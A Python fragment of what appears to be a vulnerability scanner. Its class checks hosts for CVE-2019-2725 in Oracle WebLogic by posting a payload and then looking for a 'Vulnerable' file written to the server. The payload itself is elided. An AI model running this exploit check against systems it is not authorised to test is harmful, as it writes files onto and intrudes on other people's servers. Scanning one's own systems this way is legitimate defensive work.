...
class CVE20192725(QThread):
    headers = {'user-agent': 'Gr33k/0.0.1', 'content-type': 'text/xml', }
    VUL = 'CVE-2019-2725'
    ...
    def run(self):
        try:
            r=requests.post('http://'+ str(self.ip) + ':' + str(self.port) + self.path,headers=self.headers,data=self.payload,timeout=3)
            time.sleep(3)
            r2 = requests.get('http://'+ str(self.ip) + ':' + str(self.port) + '/_async/favicon.ico')
            #print(r.status_code)
            if(r.status_code==202) and (r2.text == 'Vulnerable'):
                self.signal[str, str].emit("[+] CVE-2019-2725 漏洞存在", 'red')
            else:
                self.signal[str, str].emit("[-] CVE-2019-2725 漏洞不存在", 'green')
        except:
            self.signal[str, str].emit("[-] CVE-2019-2725 连接拒绝", 'green')